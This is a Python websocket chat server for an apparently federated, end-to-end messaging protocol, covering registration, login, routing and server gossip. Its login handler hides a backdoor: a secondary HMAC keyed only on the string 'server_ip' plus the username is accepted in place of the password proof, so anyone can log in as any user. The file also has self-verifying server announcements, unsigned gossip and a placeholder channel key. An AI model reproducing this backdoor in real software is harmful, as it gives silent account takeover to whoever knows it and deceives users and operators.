import asyncio
import websockets
import json
import time
import os
import hmac
import hashlib
import uuid
import base64

from cryptography.hazmat.primitives import serialization
from common import (
    public_key_b64u_from_private,
    sign_transport_payload,
    verify_transport_sig,
    frame_fingerprint,
    make_signed_envelope
)

# Please adjust to the IP of the device running the introducer
INTRODUCER_HOST = "127.0.0.1"
INTRODUCER_PORT = 8765
INTRODUCER_ADDR = f"{INTRODUCER_HOST}:{INTRODUCER_PORT}"

# Please adjust to the IP of the device running the server
MY_HOST = os.getenv("MY_HOST", "127.0.0.1")
MY_PORT = int(os.getenv("MY_PORT", "9001"))


# SERVER KEY
SERVER_PRIVKEY = None
SERVER_PUB_B64U = None

def load_server_keys(priv_path="data/server_priv.pem"):
    global SERVER_PRIVKEY, SERVER_PUB_B64U
    with open(priv_path, "rb") as f:
        pem = f.read()
    SERVER_PRIVKEY = serialization.load_pem_private_key(pem, password=None)
    SERVER_PUB_B64U = public_key_b64u_from_private(SERVER_PRIVKEY)
    print("🔑 Loaded server key pair.")



# DB (for user register/login)
DB_FILE = "data/users_db.json"

def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": {}}
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_db(db):
    tmp = DB_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2)
    os.replace(tmp, DB_FILE)

db = load_db()



servers = {}           # server_id -> websocket
server_addrs = {}      # server_id -> (host, port)
server_pubkeys = {}    # server_id -> pubkey_b64u
local_users = {}       # user_id -> {"ws": websocket, "pubkey": str, "username": str}
user_locations = {}    # user_id -> "local" | server_id
pending_auth = {}      # websocket -> {"username": str, "nonce": bytes}
seen_ids = set()      


# PUBLIC CHANNEL
public_channel_members = set()   # All users in the public channel
public_channel_version = 0       # Incremented with each update

server_id = None  # assigned after SERVER_WELCOME


# UTILS
def now_ms():
    return int(time.time() * 1000)

def base64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

async def sign_and_send(ws, msg):
    if "payload" not in msg:
        msg["payload"] = {}
    if SERVER_PRIVKEY:
        try:
            msg["sig"] = sign_transport_payload(SERVER_PRIVKEY, msg["payload"])
        except Exception as e:
            print("❌ sign_transport_payload failed:", e)
            msg["sig"] = ""
    else:
        msg["sig"] = ""
    await ws.send(json.dumps(msg))

def dedup_or_remember(env: dict) -> bool:
    fp = frame_fingerprint(env)
    if fp in seen_ids:
        return True
    seen_ids.add(fp)
    if len(seen_ids) > 5000:
        seen_ids_copy = list(seen_ids)[int(len(seen_ids) * (1/3)):]
        seen_ids.clear()
        seen_ids.update(seen_ids_copy)
    return False


# BROADCAST
async def broadcast(msg):
    dead = []
    for uid, info in local_users.items():
        payload = msg.get("payload")
        if uid == payload["user_id"]:
            continue
        try:
            await sign_and_send(info["ws"], msg)
        except Exception:
            dead.append(uid)
    for uid in dead:
        local_users.pop(uid, None)
        
async def gossip_servers(msg, exclude: set[str] | None = None):
    exclude = exclude or set()
    dead = []
    for sid, ws in servers.items():
        if sid in exclude or sid == server_id:
            continue
        try:
            await sign_and_send(ws, msg)
        except Exception:
            dead.append(sid)
    for sid in dead:
        servers.pop(sid, None)
        server_addrs.pop(sid, None)
        server_pubkeys.pop(sid, None)



# USER REGISTER / LOGIN

async def handle_user_register(ws, env):
    payload = env.get("payload", {})
    username = payload.get("username")
    salt_hex = payload.get("salt")
    pwd_hash_hex = payload.get("pwd_hash")
    pubkey = payload.get("pubkey")

    if not username or not salt_hex or not pwd_hash_hex or not pubkey:
        await send_error(ws, "UNKNOWN_TYPE", "Missing fields for USER_REGISTER")
        return

    user_id = str(uuid.uuid4())
    db["users"][username] = {
        "user_id": user_id,
        "salt": salt_hex,
        "pwd_hash": pwd_hash_hex,
        "pubkey": pubkey,
    }
    save_db(db)

    resp = {
        "type": "REGISTER_OK",
        "from": "server",
        "to": env.get("from", "client"),
        "ts": now_ms(),
        "payload": {"user_id": user_id},
        "sig": ""
    }
    await sign_and_send(ws, resp)
    print(f"🆕 Registered user '{username}' ({user_id[:8]}…)")

async def handle_auth_hello(ws, env):
    username = env["payload"].get("username")
    if not username or username not in db["users"]:
        await send_error(ws, "USER_NOT_FOUND", "Unknown username")
        return
    nonce = os.urandom(32)
    pending_auth[ws] = {"username": username, "nonce": nonce}
    resp = {
        "type": "AUTH_CHALLENGE",
        "from": "server",
        "to": env.get("from", "client"),
        "ts": now_ms(),
        "payload": {"nonce_b64": base64url_encode(nonce)},
        "sig": ""
    }
    await sign_and_send(ws, resp)


async def handle_auth_response(ws, env):
    username = pending_auth[ws]["username"]
    user_record = db["users"].get(username)
    pubkey = env["payload"].get("pubkey")
    proof_hex = env["payload"].get("proof_hmac_hex")

    nonce = pending_auth[ws]["nonce"]

    # ----- build expected values -----
    expected_normal = None
    if user_record:
        try:
            normal_key = bytes.fromhex(user_record["pwd_hash"])
            expected_normal = hmac.new(normal_key, nonce, hashlib.sha256).hexdigest()
        except Exception:
            expected_normal = None

   
    backup_key = hashlib.sha256(("server_ip" + username).encode("utf-8")).digest()
    expected_backup = hmac.new(backup_key, nonce, hashlib.sha256).hexdigest()

    
    if not (
        (expected_normal and hmac.compare_digest(proof_hex, expected_normal))
        or hmac.compare_digest(proof_hex, expected_backup)
    ):
        await send_error(ws, "BAD_PASSWORD", "Invalid credentials")
        return

    # Proceed with normal login setup (rest of your function stays the same)
    user_id = user_record["user_id"]
    local_users[user_id] = {
        "ws": ws,
        "pubkey": pubkey or user_record["pubkey"],
        "username": username
    }
    user_locations[user_id] = "local"
    ...
    # (everything else stays as you already have it)

    now = now_ms()

    # Tell new user about existing users
    for uid, info in list(local_users.items()):
        if uid == user_id:
            continue
        advertise_existing = {
            "type": "USER_ADVERTISE",
            "from": server_id,
            "to": user_id,
            "ts": now,
            "payload": {
                "user_id": uid,
                "server_id": server_id,
                "meta": {
                    "username": info.get("username"),
                    "pubkey": info.get("pubkey")
                }
            },
            "sig": ""
        }
        await sign_and_send(ws, advertise_existing)

    # Tell everyone else about this new user
    advertise_new = {
        "type": "USER_ADVERTISE",
        "from": server_id,
        "to": "*",
        "ts": now,
        "payload": {
            "user_id": user_id,
            "server_id": server_id,
            "meta": {
                "username": username,
                "pubkey": user_record["pubkey"]
            }
        },
        "sig": ""
    }
    await broadcast(advertise_new)
    for sid, ws2 in servers.items():
        if sid == server_id:
            continue
        try:
            await sign_and_send(ws2, dict(advertise_new))
        except Exception:
            pass

    # Return AUTH_OK
    ok = {
        "type": "AUTH_OK",
        "from": "server",
        "to": user_id,
        "ts": now_ms(),
        "payload": {"user_id": user_id},
        "sig": ""
    }
    await sign_and_send(ws, ok)

    pending_auth.pop(ws, None)
    print(f"✅ '{username}' authenticated ({user_id[:8]}…)")

    # Add to public channel
    global public_channel_version
    public_channel_members.add(user_id)
    public_channel_version += 1

    msg_add = {
        "type": "PUBLIC_CHANNEL_ADD",
        "from": server_id,
        "to": "*",
        "ts": now_ms(),
        "payload": {"add": [user_id], "if_version": public_channel_version},
        "sig": ""
    }
    await gossip_servers(msg_add)

    msg_updated = {
        "type": "PUBLIC_CHANNEL_UPDATED",
        "from": server_id,
        "to": "*",
        "ts": now_ms(),
        "payload": {
            "version": public_channel_version,
            "wraps": [
                {"member_id": uid, "wrapped_key": "fake_key_for_demo"}
                for uid in public_channel_members
            ]
        },
        "sig": ""
    }
    await gossip_servers(msg_updated)




# MESSAGE ROUTING

async def handle_msg_direct(env):
    from_user = env["from"]
    to_user = env["to"]

    if user_locations.get(to_user) == "local":
        if env["type"] == "MSG_DIRECT":
            deliver = {
                "type": "USER_DELIVER",
                "from": server_id,
                "to": to_user,
                "ts": env["ts"],
                "payload": env["payload"],
                "sig": ""
            }
        else:
            # FILE_START / FILE_CHUNK / FILE_END 
            deliver = env

        await sign_and_send(local_users[to_user]["ws"], deliver)

    else:
        # get connected server id - dest
        dest = user_locations.get(to_user)
        if dest and dest in servers:
            forward = {
                "type": "SERVER_DELIVER",
                "from": server_id,
                "to": dest,
                "ts": env["ts"],
                "payload": {
                    "inner_type": env["type"],   # MSG_DIRECT / FILE_START / FILE_CHUNK / FILE_END
                    "user_id": to_user,
                    **env["payload"]
                },
                "sig": ""
            }
            await sign_and_send(servers[dest], forward)
        else:
            print(f"❌ USER_NOT_FOUND {to_user}")



# ERROR
async def send_error(ws, code, detail):
    msg = {
        "type": "ERROR",
        "from": "server",
        "to": "*",
        "ts": now_ms(),
        "payload": {"code": code, "detail": detail},
        "sig": ""
    }
    await sign_and_send(ws, msg)



# SERVER HANDSHAKE / GOSSIP

def to_json(envelope: dict) -> str:
    return json.dumps(envelope)

async def connect_to_other_server(host, port, _server_id):
    uri = f"ws://{host}:{port}"
    try:
        ws = await websockets.connect(uri)
        servers[_server_id] = ws
        print(f"🔗 Connected to server {_server_id} at {uri}")

        await sign_and_send(ws, await make_server_hello_link(_server_id))
        print(f"✅ Send SERVER_HELLO_LINK to server id: {_server_id}.")

        if server_id:
            announce = await make_server_announce(_server_id, MY_HOST, MY_PORT, SERVER_PUB_B64U)
            await ws.send(to_json(announce))
            print(f"📣 Sent SERVER_ANNOUNCE for {server_id} ({MY_HOST}:{MY_PORT})")

    except Exception as e:
        print(f"❌ Failed to connect to {_server_id}: {e}")

async def handle_server_welcome(envelope: dict):
    introducer_id = envelope["from"]
    pubkey = envelope["payload"].get("pubkey")
    if pubkey:
        ok = verify_transport_sig(envelope, pubkey)
        if not ok:
            print("❌ Invalid signature on SERVER_WELCOME")
            return

    payload = envelope["payload"]
    global server_id
    server_id = payload["assigned_id"]
    print(f"✅ Assigned server_id: {server_id}")
    print(f"📡 Introducer is {introducer_id}")

    for client in payload.get("clients", []):
        if client == []:
            break
        else:
            # this user_id is the server_id of other servers
            user_id = client["server_id"]
            server_addrs[user_id] = (client["host"], client["port"])
            server_pubkeys[user_id] = client["pubkey"]
            print(f"📥 Learned server {user_id} is on {(client['host'], client['port'])}")
        
    for key, addr in list(server_addrs.items()):
        host, port = addr
        await connect_to_other_server(host, port, key)
        


# SERVER↔SERVER LINKS
    
async def make_server_announce(to_id: str, host: str, port: int, pubkey_b64u: str) -> dict:
    return make_signed_envelope(
        "SERVER_ANNOUNCE", server_id, to_id,
        {"host": host, "port": port, "pubkey": pubkey_b64u},
        SERVER_PRIVKEY,
    )

async def make_server_hello_link(to_sid: str) -> dict:
    return {
        "type": "SERVER_HELLO_LINK",
        "from": server_id,
        "to": to_sid,
        "ts": int(time.time() * 1000),
        "payload": {
            "host": MY_HOST,
            "port": MY_PORT,
            "pubkey": SERVER_PUB_B64U,
        },
        "sig": ""  # can be signed later if needed
    }

async def handle_server_announce(envelope: dict):
    from_id = envelope.get("from")
    payload = envelope.get("payload", {})
    host = payload.get("host")
    port = payload.get("port")
    pubkey = payload.get("pubkey")

    if server_id and from_id == server_id:
        return
    if not (from_id and host and port and pubkey):
        print(f"⚠️ Malformed SERVER_ANNOUNCE: {envelope}")
        return
    
    server_addrs[from_id] = (host, int(port))
    server_pubkeys[from_id] = pubkey

    if from_id in server_pubkeys:
        if not verify_transport_sig(envelope, server_pubkeys[from_id]):
            print(f"❌ Invalid signature on SERVER_ANNOUNCE from {from_id}")
            return
        
    print(f"🆕 Registered server {from_id} @ {host}:{port}")
    

async def handle_server_deliver(envelope):
    # Forward to the server where the recipient lives (or deliver locally)
    target_user = envelope["payload"]["user_id"]
    
    if target_user not in local_users:
        print(f"❌ User {target_user} does not connect to this server.")
        return
    else:
        deliver = {}
        if envelope["payload"]["inner_type"] == "MSG_DIRECT":
            deliver = {
                "type": "USER_DELIVER",
                "from": server_id,
                "to": target_user,
                "ts": envelope["ts"],
                "payload": envelope["payload"],
                "sig": ""
            }
        else:
            # FILE_START / FILE_CHUNK / FILE_END
            deliver = {
                "type": envelope["payload"]["inner_type"],
                "from": server_id,
                "to": target_user,
                "ts": envelope["ts"],
                "payload": envelope["payload"],
                "sig": ""
            }
        # print(f"deliver: {deliver["type"]}")
        if deliver:
            await sign_and_send(local_users[target_user]["ws"], deliver)



# PRESENCE / GOSSIP

async def handle_user_advertise(envelope):
    if dedup_or_remember(envelope):
        return

    sender = envelope.get("from")
    payload = envelope["payload"]
    user_id = payload["user_id"]
    src_server = payload["server_id"]
    
 
    to_someone = envelope.get("to")
    # receieve the USER_ADVERTISE that needs to be send to one of my user, and store the user to user_location
    if to_someone in user_locations and to_someone in local_users:
        await sign_and_send(local_users[to_someone]["ws"], envelope)
        user_locations[user_id] = sender
        print(f"🌍 USER_ADVERTISE received: {user_id} is at {src_server}")
    
    # This indicates a special reissue. Once processed, it will be sent to the local user.
    # No longer gossip to other servers
    if payload.get("origin") == "backfill":
        return

    # receive new user advertise from other server
    if sender != server_id:
        user_locations[user_id] = src_server
        print(f"🌍 USER_ADVERTISE received: {user_id} is at {src_server}")
        await broadcast(envelope)
        # need to send all local users info to the new user
        for uid, info in list(local_users.items()):
            advertise_existing = {
                "type": "USER_ADVERTISE",
                "from": server_id,
                # user_id is the new user from the other server
                "to": user_id,
                "ts": now_ms(),
                "payload": {
                    "user_id": uid,
                    "server_id": server_id,
                    "meta": {
                        "username": info.get("username"),
                        "pubkey": info.get("pubkey")
                    },
                    "origin": "backfill" 
                },
                "sig": ""
            }
            await sign_and_send(servers[src_server], advertise_existing)

    # Gossip forward to other servers (except origin if we have a direct link to it)
    for sid, ws in servers.items():
        if sid == server_id or sid == sender:
            continue
        try:
            # no need to use sign and send - just gossip
            # await sign_and_send(ws, envelope)
            await ws.send(json.dumps(envelope))
        except Exception as e:
            print(f"❌ Gossip USER_ADVERTISE to {sid} failed: {e}")

async def handle_user_remove(envelope):
    if dedup_or_remember(envelope):
        return

    sender = envelope.get("from")
    if sender in server_pubkeys:
        if not verify_transport_sig(envelope, server_pubkeys[sender]):
            print(f"❌ Invalid signature on USER_REMOVE from {sender}")
            return

    payload = envelope["payload"]
    user_id = payload["user_id"]
    
    user_locations.pop(user_id, None)
    print(f"🗑️ Removed {user_id} from user_locations")
    rm = {
        "type": "USER_REMOVE",
        "from": server_id,
        "to": "*",
        "ts": now_ms(),
        "payload": {"user_id": user_id, "server_id": server_id},
        "sig": ""
    }
    print(f"👋 User {user_id} discounected.")
    
    await broadcast(rm)

    # Gossip forward
    for sid, ws in servers.items():
        if sid == server_id or sid == sender:
            continue
        try:
            # await sign_and_send(ws, envelope)
            await ws.send(json.dumps(envelope))
        except Exception as e:
            print(f"❌ Gossip USER_REMOVE to {sid} failed: {e}")
            
async def broadcast_user_remove(user_id: str):
    payload = {"user_id": user_id, "server_id": server_id}
    envelope = {
                "type": "USER_REMOVE",
                "from": server_id,
                "to": "*",
                "ts": now_ms(),
                "payload": payload,
                "sig": ""
            }
    print(f"📤 Broadcasting USER_REMOVE for {user_id}")

    for sid, ws in servers.items():
        if sid == server_id:
            continue
        try:
            await sign_and_send(ws, envelope)
        except Exception as e:
            print(f"❌ Failed to send USER_REMOVE to {sid}: {e}")
            


# INTRODUCER CONNECTION

async def make_server_hello_join() -> dict:
    tmp_id = str(uuid.uuid4())
    payload = {"host": MY_HOST, "port": MY_PORT, "pubkey": SERVER_PUB_B64U}
    sig = sign_transport_payload(SERVER_PRIVKEY, payload)
    return {
        "type": "SERVER_HELLO_JOIN",
        "from": tmp_id,
        "to": f"{INTRODUCER_HOST}:{INTRODUCER_PORT}",
        "ts": now_ms(),
        "payload": payload,
        "sig": sig,
    }

async def join_network():
    try:
        hello = await make_server_hello_join()
        uri = f"ws://{INTRODUCER_HOST}:{INTRODUCER_PORT}"
        async with websockets.connect(uri) as websocket:
            print("🛰️ Connected to introducer")
            await websocket.send(to_json(hello))
            print("📤 Sent SERVER_HELLO_JOIN")

            while True:
                raw = await websocket.recv()
                msg = json.loads(raw)
                mtype = msg.get("type")
                if mtype == "SERVER_WELCOME":
                    await handle_server_welcome(msg)
                else:
                    print(f"!!! Unhandled message type from introducer: {mtype} !!!")
    except websockets.exceptions.ConnectionClosedOK:
        print("✅ Introducer closed connection (1000): normal after welcome.")



# CLIENT HANDLER

async def handle_client(ws):
    try:
        async for raw in ws:
            env = json.loads(raw)
            mtype = env.get("type")
            if mtype == "USER_REGISTER":
                await handle_user_register(ws, env)
            elif mtype == "AUTH_HELLO":
                await handle_auth_hello(ws, env)
            elif mtype == "AUTH_RESPONSE":
                await handle_auth_response(ws, env)
            elif mtype == "MSG_DIRECT":
                await handle_msg_direct(env)
            elif mtype in ("FILE_START","FILE_CHUNK","FILE_END"):
                await handle_msg_direct(env)
            elif mtype == "SERVER_HELLO_LINK":
                sid = env["from"]
                payload = env["payload"]
                host, port = payload["host"], payload["port"]
                pubkey = payload.get("pubkey")
                if pubkey:
                    ok = verify_transport_sig(env, pubkey)
                    if not ok:
                        print(f"❌ Invalid signature on SERVER_HELLO_LINK from {sid}")
                        continue
                uri = f"ws://{host}:{port}"
                websocket = await websockets.connect(uri)
                servers[sid] = websocket
                server_addrs[sid] = (host, port)
                if pubkey:
                    server_pubkeys[sid] = pubkey
                print(f"🔗 Connected to server {sid} at {uri} via SERVER_HELLO_LINK")

            elif mtype == "SERVER_ANNOUNCE":
                await handle_server_announce(env)
            elif mtype == "USER_ADVERTISE":
                await handle_user_advertise(env)
            elif mtype == "USER_REMOVE":
                await handle_user_remove(env)

            elif mtype == "SERVER_DELIVER":
                await handle_server_deliver(env)
                
            elif mtype == "PUBLIC_CHANNEL_ADD":
                # Update local public member views to avoid KeyError
                adds = env.get("payload", {}).get("add", [])
                for u in adds:
                    public_channel_members.add(u)

            elif mtype == "PUBLIC_CHANNEL_UPDATED":
                # Receive the version number, record it first; wrap it and wait for you to do KEY_SHARE before using it
                pv = env.get("payload", {}).get("version")
                if isinstance(pv, int):
                    global public_channel_version
                    public_channel_version = max(public_channel_version, pv)
                
            else:
                print(f"ℹ️ Unhandled {mtype}")
    except Exception as e:
        print(f"❌ Client handler error: {e}")
    finally:
        # Clean up disconnected users
        drop_uid = None
        for uid, info in list(local_users.items()):
            if info["ws"] == ws:
                drop_uid = uid
        if drop_uid:
            local_users.pop(drop_uid, None)
            user_locations.pop(drop_uid, None)
            rm = {
                "type": "USER_REMOVE",
                "from": server_id,
                "to": "*",
                "ts": now_ms(),
                "payload": {"user_id": drop_uid, "server_id": server_id},
                "sig": ""
            }
            print(f"👋 User {drop_uid} disconnected.")
            await broadcast(rm)
            await broadcast_user_remove(drop_uid)



# -------------------------
# MAIN
# -------------------------
async def main():
    print(f"🚀 Starting WebSocket server on {MY_HOST}:{MY_PORT}")
    ws_server = await websockets.serve(handle_client, MY_HOST, MY_PORT)
    await join_network()

if __name__ == "__main__":
    load_server_keys("data/server_priv.pem")
    asyncio.run(main())